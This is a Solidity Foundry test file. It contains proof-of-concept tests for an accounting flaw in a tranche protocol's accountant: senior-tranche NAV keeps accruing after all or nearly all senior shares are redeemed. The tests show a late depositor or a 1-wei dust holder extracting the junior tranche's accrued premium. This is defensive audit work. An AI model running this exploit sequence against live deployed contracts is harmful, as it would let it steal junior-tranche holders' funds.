// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import { console2 } from "../../lib/forge-std/src/console2.sol";
import { IERC20 } from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import { DeployScript } from "../../script/Deploy.s.sol";
import { MarketDeploymentConfig } from "../../script/config/MarketDeploymentConfig.sol";
import { IRoycoAccountant } from "../../src/interfaces/IRoycoAccountant.sol";
import { IRoycoFactory } from "../../src/interfaces/IRoycoFactory.sol";
import { IRoycoVaultTranche } from "../../src/interfaces/IRoycoVaultTranche.sol";
import { IdenticalAssetsOracleQuoter } from "../../src/kernels/base/quoter/base/IdenticalAssetsOracleQuoter.sol";
import { WAD, ZERO_NAV_UNITS } from "../../src/libraries/Constants.sol";
import { NAV_UNIT, TRANCHE_UNIT, toTrancheUnits, toUint256 } from "../../src/libraries/Units.sol";
import { BaseTest } from "../base/BaseTest.t.sol";

/**
 * @title AccountantAttributionBugPoCTest
 * @notice PoC demonstrating that `RoycoAccountant` attributes ST raw-NAV deltas wholly to ST
 *         effective NAV (and symmetrically for JT), with no awareness of the actual tranche
 *         share population. The pathological state — `stEffectiveNAV > 0` while ST `totalSupply
 *         == 0` — is reachable in three moves:
 *
 *           1. ST + JT both deposit → both sides have positive `rawNAV` AND positive `totalSupply`.
 *           2. Yield arrives that flows through the YDM as a risk premium → `jtEffectiveNAV >
 *              jtRawNAV` (JT has accrued a claim on ST-side raw assets), equivalently
 *              `stEffectiveNAV < stRawNAV` (ST's claim is smaller than the raw kernel-held
 *              attribution).
 *           3. All ST holders redeem → kernel pays out only `stClaimOnSelfRawNAV`, the residual
 *              `jtClaimOnSTRawNAV` portion of `stRawNAV` is left in the kernel. `stShares == 0`
 *              now, but `stRawNAV > 0`.
 *
 *         Any subsequent yield grows `stRawNAV` further, the accountant attributes the delta
 *         (after the YDM split) to `stEffectiveNAV`, and the resulting ST share-price reads as
 *         `stEffectiveNAV / 0` → unbounded.
 *
 * @dev Modeled after `PausabilityTestSuite` — uses sNUSD on mainnet with the admin-oracle
 *      ERC4626 template. Yield is simulated by bumping the kernel's stored conversion rate
 *      (admin lever) which scales BOTH `stRawNAV` and `jtRawNAV` proportionally. We don't need
 *      asymmetric yield: any yield routed through the YDM creates the `jtEffectiveNAV >
 *      jtRawNAV` claim that the bug rides on.
 */
contract AccountantAttributionBugPoCTest is BaseTest {
    address internal constant SNUSD = 0x08EFCC2F3e61185D0EA7F8830B3FEc9Bfa2EE313;
    uint256 internal constant FORK_BLOCK = 24_180_513;

    function setUp() public {
        _setUpRoyco();
    }

    function _setUpRoyco() internal override {
        super._setUpRoyco();
        DeployScript.DeploymentResult memory result = _deployMarket();
        _setDeployedMarket(result);
        _setupProviders();
        _fundProviders();
    }

    function _forkConfiguration() internal view override returns (uint256, string memory) {
        return (FORK_BLOCK, vm.envString("MAINNET_RPC_URL"));
    }

    function _deployMarket() internal returns (DeployScript.DeploymentResult memory) {
        DeployScript.IdenticalERC4626SharesToAdminOracleQuoterKernelParams memory kernelParams =
            DeployScript.IdenticalERC4626SharesToAdminOracleQuoterKernelParams({ initialConversionRateWAD: WAD });

        DeployScript.AdaptiveCurveYDM_V2_Params memory ydmParams = DeployScript.AdaptiveCurveYDM_V2_Params({
            // Make the YDM divert a sizable share of ST yield to JT so the residual
            // (jtClaimOnSTRawNAV) builds up quickly after the first sync.
            jtYieldShareAtZeroUtilWAD: 0.5e18,
            jtYieldShareAtTargetUtilWAD: 0.5e18,
            jtYieldShareAtFullUtilWAD: 1e18,
            maxAdaptationSpeedWAD: uint64(30e18 / uint256(365 days))
        });

        IRoycoFactory.RoleAssignmentConfiguration[] memory roleAssignments = _generateRoleAssignments();

        MarketDeploymentConfig.MarketConfig memory config = MarketDeploymentConfig.MarketConfig({
            marketName: "sNUSD_POC",
            chainId: block.chainid,
            seniorTrancheName: "Royco PoC Senior sNUSD",
            seniorTrancheSymbol: "RPS-sNUSD",
            juniorTrancheName: "Royco PoC Junior sNUSD",
            juniorTrancheSymbol: "RPJ-sNUSD",
            seniorAsset: SNUSD,
            juniorAsset: SNUSD,
            stDustTolerance: 1,
            jtDustTolerance: 1,
            kernelType: DeployScript.KernelType.Identical_ERC4626_ST_JT_SharePriceToAdminOracle_Kernel,
            kernelSpecificParams: abi.encode(kernelParams),
            stSelfLiquidationBonusWAD: 0,
            enforceVaultSharesTransferWhitelist: false,
            stProtocolFeeWAD: 0,
            jtProtocolFeeWAD: 0,
            jtYieldShareProtocolFeeWAD: 0,
            coverageWAD: COVERAGE_WAD,
            betaWAD: 1e18,
            liquidationUtilizationWAD: LIQUIDATION_UTILIZATION_WAD,
            fixedTermDurationSeconds: FIXED_TERM_DURATION_SECONDS,
            ydmType: DeployScript.YDMType.AdaptiveCurve_V2,
            transferAgentAddress: address(0),
            ydmSpecificParams: abi.encode(ydmParams)
        });

        uint32 expiry = DEPLOY_SCRIPT.getChainConfig(block.chainid).scheduledOperationsExpirySeconds;
        return DEPLOY_SCRIPT.deploy(config, OWNER_ADDRESS, PROTOCOL_FEE_RECIPIENT_ADDRESS, expiry, roleAssignments, DEPLOYER.privateKey);
    }

    function _fundProviders() internal {
        uint256 amount = 1_000_000e18;
        deal(SNUSD, ST_ALICE_ADDRESS, amount);
        deal(SNUSD, ST_BOB_ADDRESS, amount);
        deal(SNUSD, JT_ALICE_ADDRESS, amount);
        deal(SNUSD, JT_BOB_ADDRESS, amount);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // POC
    // ═══════════════════════════════════════════════════════════════════════════

    /// @notice Bug: ST raw-NAV deltas are attributed wholly to ST effective NAV even after
    ///         every ST holder has redeemed. Residual `stRawNAV` (the JT's claim on ST-raw
    ///         assets accrued via YDM risk premium) grows unattended, lifting `stEffectiveNAV`
    ///         without any outstanding ST shares to back it — making ST share-price divergent.
    function test_poc_stEffectiveNAVCanGrowWithZeroStShares() external {
        // STEP 1 — both tranches enter the market.
        uint256 jtAmount = 100_000e18;
        uint256 stAmount = 200_000e18; // coverage 0.2 lets ST be up to 5x JT NAV; pick 2x for headroom.
        _depositJT(JT_ALICE_ADDRESS, jtAmount);
        _depositST(ST_ALICE_ADDRESS, stAmount);
        _sync();

        // Sanity: both sides have shares + positive NAV.
        assertGt(ST.totalSupply(), 0, "ST should have outstanding shares before yield");
        assertGt(JT.totalSupply(), 0, "JT should have outstanding shares before yield");
        assertGt(toUint256(ST.getRawNAV()), 0, "stRawNAV > 0 pre-yield");
        assertGt(toUint256(JT.getRawNAV()), 0, "jtRawNAV > 0 pre-yield");

        // STEP 2 — bump the kernel's stored conversion rate. Both stRawNAV and jtRawNAV scale
        // up proportionally. Sync routes the yield through the YDM, sending ~50% of ST yield
        // to JT as a risk premium (jtYieldShareAtZeroUtilWAD = 0.5e18 above), so post-sync
        // `jtEffectiveNAV > jtRawNAV` — JT now has a claim on ST-side raw assets.
        uint256 yieldFactorWAD = 1.1e18; // +10% on the stored rate
        _bumpStoredConversionRate(yieldFactorWAD);
        _sync();

        IRoycoAccountant.RoycoAccountantState memory s1 = ACCOUNTANT.getState();
        assertGt(toUint256(s1.lastJTEffectiveNAV), toUint256(s1.lastJTRawNAV), "JT must hold a claim on ST raw NAV after risk-premium distribution");

        uint256 jtClaimOnSTRawNAV = toUint256(s1.lastJTEffectiveNAV) - toUint256(s1.lastJTRawNAV);
        assertGt(jtClaimOnSTRawNAV, 0, "jtClaimOnSTRawNAV should be strictly positive");
        console2.log("stSharePrice Before Drain", toUint256(ST.convertToAssets(1e18).nav));

        // STEP 3 — every ST holder redeems out. Kernel pays only `stClaimOnSelfRawNAV` worth
        // of ST assets; the `jtClaimOnSTRawNAV` portion stays in the kernel.
        _redeemAllST(ST_ALICE_ADDRESS);
        _sync();

        // Pathological state: ST has zero shares but a non-zero raw NAV residual.
        assertEq(ST.totalSupply(), 0, "all ST shares redeemed");

        IRoycoAccountant.RoycoAccountantState memory s2 = ACCOUNTANT.getState();
        uint256 stRawNAVAfterDrain = toUint256(s2.lastSTRawNAV);
        assertGt(stRawNAVAfterDrain, 0, "PoC.1: stRawNAV remains positive after full ST redemption (residual jtClaimOnSTRawNAV)");

        // The residual matches the JT's previously-accrued claim on ST raw assets, modulo
        // tiny rounding from redemption math.
        uint256 stEffectiveNAVAfterDrain = toUint256(s2.lastSTEffectiveNAV);
        assertApproxEqAbs(
            stRawNAVAfterDrain,
            toUint256(s2.lastJTEffectiveNAV) - toUint256(s2.lastJTRawNAV) + stEffectiveNAVAfterDrain,
            1e10,
            "raw NAV residual is conserved against JT's claim"
        );

        // STEP 4 — second yield event. ST still has zero shares. With the current accountant,
        // the new `deltaST` is attributed (after the YDM split) to `stEffectiveNAV`, which
        // grows unbounded relative to the (zero) share supply.
        uint256 stEffectiveNAVBefore = stEffectiveNAVAfterDrain;
        _bumpStoredConversionRate(yieldFactorWAD); // another +10%
        _sync();

        IRoycoAccountant.RoycoAccountantState memory s3 = ACCOUNTANT.getState();
        uint256 stEffectiveNAVAfter = toUint256(s3.lastSTEffectiveNAV);

        assertEq(ST.totalSupply(), 0, "PoC.2: ST share supply is still zero");
        assertGt(stEffectiveNAVAfter, stEffectiveNAVBefore, "PoC.3: stEffectiveNAV grew on the second yield event despite ST.totalSupply == 0 (bug confirmed)");

        // BUG IMPACT — ST share-price computation: `stEffectiveNAV / stShares = X / 0`. Any
        // future ST depositor would mint shares against an unbounded NAV-per-share basis (the
        // kernel's `navToMintSharesAt = stEffectiveNAV` against zero existing supply lets the
        // first new deposit absorb the entire residual at a vanishingly small share count).
        emit log_named_uint("residual stEffectiveNAV with 0 ST shares", stEffectiveNAVAfter);
        emit log_named_uint("stEffectiveNAV growth on the second yield (attributed to nobody)", stEffectiveNAVAfter - stEffectiveNAVBefore);

        console2.log("stSharePrice After Drain", toUint256(ST.convertToAssets(1e18).nav));
    }

    /// @notice What happens when someone tries to mint ST shares while the tranche is in the
    ///         pathological state (`stEffectiveNAV > 0`, `stShares == 0`).
    /// @dev Walks the same 4-step setup as the first test, then drops in a fresh ST depositor
    ///      and inspects: `valueAllocated`, share count, implied share price, and what the
    ///      depositor actually gets back on immediate redeem.
    function test_poc_newSTDepositorEntersInflatedSharePrice() external {
        // Replay setup: deposit → yield → sync (risk premium distributes) → full ST drain →
        // sync (still no observable residual yet) → ANOTHER yield → sync (NOW the bug
        // attributes the new ST yield delta to `stEffectiveNAV` even though no ST shares
        // exist; this is the moment the inflated share-price basis is set).
        uint256 jtAmount = 100_000e18;
        uint256 stAmount = 200_000e18;
        _depositJT(JT_ALICE_ADDRESS, jtAmount);
        _depositST(ST_ALICE_ADDRESS, stAmount);
        _sync();
        _bumpStoredConversionRate(1.1e18);
        _sync();
        _redeemAllST(ST_ALICE_ADDRESS);
        _sync();
        // Second yield AFTER ST has drained — this is what loads the residual into stEffectiveNAV.
        _bumpStoredConversionRate(1.1e18);
        _sync();

        assertEq(ST.totalSupply(), 0, "precondition: ST shares fully drained");
        IRoycoAccountant.RoycoAccountantState memory pre = ACCOUNTANT.getState();
        uint256 residualNAV = toUint256(pre.lastSTEffectiveNAV);
        emit log_named_uint("[setup done] residual stEffectiveNAV with 0 ST shares", residualNAV);
        assertGt(residualNAV, 1, "precondition: stEffectiveNAV residual exists from post-drain yield");

        // ─── Act: a fresh ST holder enters ────────────────────────────────────────
        address EVE = makeAddr("EVE_ST_LATE_ENTRANT");
        deal(SNUSD, EVE, 100_000e18);
        vm.prank(LP_ROLE_ADMIN_ADDRESS);
        FACTORY.grantRole(ST_LP_ROLE, EVE, 0);

        uint256 depositAmount = 100_000e18;
        vm.startPrank(EVE);
        IERC20(SNUSD).approve(address(ST), depositAmount);
        uint256 sharesMinted = ST.deposit(toTrancheUnits(depositAmount), EVE);
        vm.stopPrank();

        IRoycoAccountant.RoycoAccountantState memory post = ACCOUNTANT.getState();
        uint256 stEffectivePostDeposit = toUint256(post.lastSTEffectiveNAV);

        emit log_named_uint("EVE deposits (NAV)", depositAmount);
        emit log_named_uint("residual stEffectiveNAV pre-deposit", residualNAV);
        emit log_named_uint("stEffectiveNAV post-deposit", stEffectivePostDeposit);
        emit log_named_uint("ST shares minted to EVE", sharesMinted);

        // Observation 1 — share count is microscopic vs the deposit amount. The virtual-share
        // offset (`shares = (totalSupply+1) * assets / (totalAssets+1)`) prices each share at
        // ~the residual NAV. With totalSupply == 0 and totalAssets ≈ 510e18, depositing
        // 100,000e18 NAV mints only ~196 shares — implicit share price ~510 NAV/share.
        uint256 impliedSharePriceWAD = stEffectivePostDeposit * 1e18 / sharesMinted;
        emit log_named_uint("implied ST share price (NAV per share, WAD)", impliedSharePriceWAD);
        assertGt(impliedSharePriceWAD, 100e18, "share price ballooned far above 1 NAV/share because of the residual");

        // Observation 2 — EVE redeems all shares. With the inflated share basis, what does she
        // get back? The residual was attributed to her via the share-mint math; on redeem,
        // each share is worth the same inflated NAV, so she recovers approximately her deposit
        // PLUS a slice of the residual (with the JT's claim absorbed).
        uint256 eveSnusdBefore = IERC20(SNUSD).balanceOf(EVE);
        vm.prank(EVE);
        ST.redeem(sharesMinted, EVE, EVE);
        uint256 eveSnusdAfter = IERC20(SNUSD).balanceOf(EVE);
        uint256 eveProceeds = eveSnusdAfter - eveSnusdBefore;
        emit log_named_uint("EVE redeem proceeds (sNUSD)", eveProceeds);
        if (eveProceeds > depositAmount) {
            emit log_named_uint("EVE NET PROFIT (residual absorbed)", eveProceeds - depositAmount);
        } else {
            emit log_named_uint("EVE shortfall (sNUSD)", depositAmount - eveProceeds);
        }

        // Observation 3 — final state of the market after EVE round-trips.
        IRoycoAccountant.RoycoAccountantState memory afterEveExit = ACCOUNTANT.getState();
        emit log_named_uint("FINAL stRawNAV", toUint256(afterEveExit.lastSTRawNAV));
        emit log_named_uint("FINAL stEffectiveNAV", toUint256(afterEveExit.lastSTEffectiveNAV));
        emit log_named_uint("FINAL ST.totalSupply()", ST.totalSupply());
        emit log_named_uint("FINAL jtRawNAV", toUint256(afterEveExit.lastJTRawNAV));
        emit log_named_uint("FINAL jtEffectiveNAV", toUint256(afterEveExit.lastJTEffectiveNAV));
    }

    /// @notice Variant: ST holders redeem ALMOST all shares, leaving 1 wei dust outstanding.
    ///         A subsequent ST yield event is attributed entirely to that 1-wei share, sending
    ///         the per-share NAV to astronomical levels.
    /// @dev This is the "soft" version of the bug — the bookkeeping is technically consistent
    ///      (every share holds a real NAV claim), but the realized share price is grotesquely
    ///      inflated for the remaining holder, AND any later ST depositor enters at this
    ///      inflated basis. The 1-wei remnant share effectively captures the residual that
    ///      WOULD have been stranded under the full-drain variant.
    function test_poc_dustResidualSharesGetAstronomicalSharePrice() external {
        uint256 jtAmount = 100_000e18;
        uint256 stAmount = 200_000e18;
        _depositJT(JT_ALICE_ADDRESS, jtAmount);
        uint256 aliceShares = _depositST(ST_ALICE_ADDRESS, stAmount);
        _sync();

        emit log_named_uint("ST_ALICE shares minted", aliceShares);

        // First yield + sync — risk premium goes to JT, creating the asymmetric claim.
        _bumpStoredConversionRate(1.1e18);
        _sync();

        // ST_ALICE redeems all-but-1-wei of her shares. One wei share remains outstanding.
        vm.prank(ST_ALICE_ADDRESS);
        ST.redeem(aliceShares - 1, ST_ALICE_ADDRESS, ST_ALICE_ADDRESS);
        _sync();

        assertEq(ST.totalSupply(), 1, "precondition: exactly 1 wei of ST share remains");

        IRoycoAccountant.RoycoAccountantState memory afterDrain = ACCOUNTANT.getState();
        uint256 stEffectiveAfterDrain = toUint256(afterDrain.lastSTEffectiveNAV);
        uint256 sharePriceAfterDrain = stEffectiveAfterDrain / ST.totalSupply();
        emit log_named_uint("stEffectiveNAV after partial drain", stEffectiveAfterDrain);
        emit log_named_uint("share price after drain (NAV per wei share)", sharePriceAfterDrain);

        // Second yield + sync — the new ST raw-NAV delta gets attributed (per the bug) to the
        // ST side. With only 1 wei share outstanding, the per-share NAV explodes.
        _bumpStoredConversionRate(1.1e18);
        _sync();

        IRoycoAccountant.RoycoAccountantState memory after2ndYield = ACCOUNTANT.getState();
        uint256 stEffective2nd = toUint256(after2ndYield.lastSTEffectiveNAV);
        uint256 sharePrice2nd = stEffective2nd / ST.totalSupply();
        emit log_named_uint("stEffectiveNAV after 2nd yield", stEffective2nd);
        emit log_named_uint("share price after 2nd yield (NAV per wei share)", sharePrice2nd);
        emit log_named_uint("share price MULTIPLIER (2nd / drain)", sharePrice2nd / sharePriceAfterDrain);

        // The lone remaining share holder can now redeem and pull out the entire residual NAV
        // worth of assets. They effectively cash in the JT's accrued risk premium.
        uint256 aliceBalanceBefore = IERC20(SNUSD).balanceOf(ST_ALICE_ADDRESS);
        vm.prank(ST_ALICE_ADDRESS);
        ST.redeem(1, ST_ALICE_ADDRESS, ST_ALICE_ADDRESS);
        uint256 aliceBalanceAfter = IERC20(SNUSD).balanceOf(ST_ALICE_ADDRESS);
        uint256 oneWeiShareRedemption = aliceBalanceAfter - aliceBalanceBefore;
        emit log_named_uint("redeem proceeds for 1 wei of ST share (sNUSD)", oneWeiShareRedemption);

        // BUG IMPACT: the 1-wei ST share got paid out ~ (residual + new yield attribution)
        // worth of assets — orders of magnitude more than anyone holding 1 wei of an honest
        // tranche should ever receive.
        assertGt(
            oneWeiShareRedemption,
            1e18, // way more than 1 wei worth of NAV — the share is "worth" the full residual
            "1 wei ST share redeemed for >1e18 sNUSD because the dust captured the entire residual"
        );

        IRoycoAccountant.RoycoAccountantState memory finalState = ACCOUNTANT.getState();
        emit log_named_uint("FINAL ST.totalSupply()", ST.totalSupply());
        emit log_named_uint("FINAL stRawNAV", toUint256(finalState.lastSTRawNAV));
        emit log_named_uint("FINAL stEffectiveNAV", toUint256(finalState.lastSTEffectiveNAV));
        emit log_named_uint("FINAL jtRawNAV", toUint256(finalState.lastJTRawNAV));
        emit log_named_uint("FINAL jtEffectiveNAV", toUint256(finalState.lastJTEffectiveNAV));
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // HELPERS
    // ═══════════════════════════════════════════════════════════════════════════

    function _depositJT(address _u, uint256 _amount) internal {
        vm.startPrank(_u);
        IERC20(SNUSD).approve(address(JT), _amount);
        JT.deposit(toTrancheUnits(_amount), _u);
        vm.stopPrank();
    }

    function _depositST(address _u, uint256 _amount) internal returns (uint256 shares) {
        vm.startPrank(_u);
        IERC20(SNUSD).approve(address(ST), _amount);
        shares = ST.deposit(toTrancheUnits(_amount), _u);
        vm.stopPrank();
    }

    function _redeemAllST(address _u) internal {
        uint256 shares = ST.balanceOf(_u);
        vm.prank(_u);
        ST.redeem(shares, _u, _u);
    }

    /// @dev Bumps the kernel's stored conversion rate by `_factorWAD` (e.g., 1.10e18 = +10%).
    ///      Affects both stRawNAV and jtRawNAV proportionally. Uses ORACLE_QUOTER_ADMIN
    ///      (delay 0 in test setup).
    function _bumpStoredConversionRate(uint256 _factorWAD) internal {
        uint256 current = IdenticalAssetsOracleQuoter(address(KERNEL)).getStoredConversionRateWAD();
        uint256 next = current * _factorWAD / WAD;
        vm.prank(ORACLE_QUOTER_ADMIN_ADDRESS);
        IdenticalAssetsOracleQuoter(address(KERNEL)).setConversionRate(next, false);
    }
}
